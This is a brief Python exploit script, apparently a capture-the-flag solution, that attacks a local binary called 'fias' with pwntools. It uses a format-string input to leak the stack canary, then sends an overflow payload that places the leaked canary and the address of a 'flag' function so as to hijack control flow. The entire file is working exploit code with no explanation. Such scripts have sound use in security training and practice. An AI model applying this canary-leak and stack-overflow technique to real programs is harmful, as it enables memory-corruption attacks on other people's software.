from pwn import *
from re import findall

elf = ELF("./fias")
p = elf.process()

p.clean(0.2)

# Leak the canary value
p.sendline("%11$p")

canary = p.recvline().decode("utf-8")
canary = findall(r"0x[0-9A-Fa-f]*00", canary)[0]
canary = int(canary, 16)

p.recvline()

payload = b"A"*25
payload += p32(canary)
payload += b"A"*12
payload += p32(elf.symbols["flag"])

p.sendline(payload)

print(p.clean(0.2).decode("latin-1"))
